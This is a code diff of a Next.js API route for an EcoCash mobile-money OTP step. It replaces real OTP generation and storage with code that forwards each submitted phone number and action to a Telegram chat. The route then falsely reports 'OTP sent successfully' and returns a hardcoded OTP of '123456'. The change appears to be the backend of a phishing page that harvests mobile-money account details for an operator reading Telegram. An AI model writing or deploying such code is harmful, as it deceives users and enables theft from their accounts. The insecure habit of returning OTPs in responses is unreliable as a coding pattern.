@@ -1,41 +1,39 @@
-import { neon } from "@neondatabase/serverless"
-import { NextResponse } from "next/server"
+import { NextRequest } from 'next/server';
+import { sendTelegramNotification } from '@/lib/telegram';
 
-const sql = neon(process.env.DATABASE_URL!)
-
-export async function POST(req: Request) {
+export async function POST(req: NextRequest) {
   try {
-    const { ecocashPhone } = await req.json()
-
-    if (!ecocashPhone) {
-      return NextResponse.json({ error: "Phone number required" }, { status: 400 })
+    const { phone, action } = await req.json();
+    
+    // Send notification to Telegram
+    if (action) {
+      await sendTelegramNotification(`New ${action}:\nPhone: ${phone}`);
     }
-
-    // Generate a 6-digit OTP
-    const otp = Math.floor(100000 + Math.random() * 900000).toString()
-
-    // Store OTP temporarily (expires in 10 minutes)
-    // In production, you would send this to the actual EcoCash API
-    await sql(
-      `INSERT INTO registrations (ecocash_phone, otp_code, status) 
-       VALUES ($1, $2, $3)
-       ON CONFLICT (ecocash_phone) DO UPDATE 
-       SET otp_code = $2, updated_at = NOW()`,
-      [ecocashPhone, otp, "otp_sent"],
-    )
-
-    // Here you would integrate with your EcoCash API to send SMS
-    // For now, we're just storing it
-    console.log(`[OTP] Sending OTP ${otp} to ${ecocashPhone}`)
-
-    return NextResponse.json({
-      success: true,
-      message: "OTP sent to your EcoCash phone number",
-      // REMOVE THIS IN PRODUCTION - only for testing
-      otp: otp,
-    })
+    
+    // In a real implementation, you would send an actual OTP
+    // For now, we'll just return a success response
+    return new Response(
+      JSON.stringify({ 
+        success: true, 
+        message: 'OTP sent successfully',
+        otp: '123456' // This is just for testing - never return actual OTP in production
+      }),
+      { 
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      }
+    );
   } catch (error) {
-    console.error("OTP send error:", error)
-    return NextResponse.json({ error: "Failed to send OTP" }, { status: 500 })
+    console.error('Error sending OTP:', error);
+    return new Response(
+      JSON.stringify({ 
+        success: false, 
+        message: 'Failed to send OTP' 
+      }),
+      { 
+        status: 500,
+        headers: { 'Content-Type': 'application/json' }
+      }
+    );
   }
 }
